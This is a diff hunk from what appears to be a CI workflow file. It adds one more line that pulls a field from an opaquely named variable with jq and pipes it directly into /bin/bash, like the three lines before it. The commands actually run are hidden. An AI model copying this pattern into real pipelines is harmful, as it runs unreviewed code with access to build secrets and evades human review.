@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$e14" | jq -r .dslv26 | /bin/bash
           echo $nnu38 | jq -r .doxu8594 | /bin/bash
           echo $de2635 | jq -r .b81 | /bin/bash
+          echo $we429 | jq -r .w25 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
